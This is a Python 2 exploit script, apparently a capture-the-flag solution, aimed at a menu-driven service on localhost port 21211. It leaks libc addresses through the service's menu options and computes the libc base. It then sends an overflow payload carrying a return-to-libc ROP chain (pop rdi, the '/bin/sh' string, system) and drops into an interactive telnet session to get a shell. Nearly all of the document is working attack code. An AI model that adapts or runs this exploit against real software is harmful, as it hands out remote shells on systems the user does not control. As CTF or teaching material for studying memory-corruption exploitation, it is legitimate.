import socket
import struct
import time
import telnetlib


HOST="localhost"
PORT=21211

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((HOST,PORT))

print "[*] Connected to %s:%d"%(HOST,PORT)

data=sock.recv(512)
sock.send("1\n")
data=sock.recv(512).split(": ")[1]
libc_addr=int(data,16)

print "[+] Get libc address:0x%x"%libc_addr

# 17ccdb /bin/sh
#1337: 0000000000046640    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
#0x00000f23: pop rdi ; ret  ;  (1 found)
# ---------------
# | poprdi_addr |
# |	binsh_addr	|
# |	system_addr	|
# |				|
# |				|
# |				|
# ---------------

data=sock.recv(512)

sock.send("2\n")
data=sock.recv(512)

sock.send("system\n")
data=sock.recv(512).split(": ")[1]
libc_system=int(data,16)

print "[+] Get system address:0x%x"%libc_system

binsh_addr  = 0x17ccdb
system_addr = 0x046640
poprdi_addr = 0x000f23
libc_bace   = libc_system - system_addr
print "[+] Leak libc_bace:0x%x"%libc_bace

payload="A"*8
payload+=struct.pack("<Q",libc_bace+poprdi_addr)
payload+=struct.pack("<Q",libc_bace+binsh_addr)
payload+=struct.pack("<Q",libc_bace+system_addr)
payload+="\n"

sock.recv(512)
sock.send("3\n")
sock.recv(512)
sock.send("%d\n"%(len(payload)))
sock.send(payload)
sock.send("4\n")


t=telnetlib.Telnet()
t.sock=sock
t.interact()
sock.close()




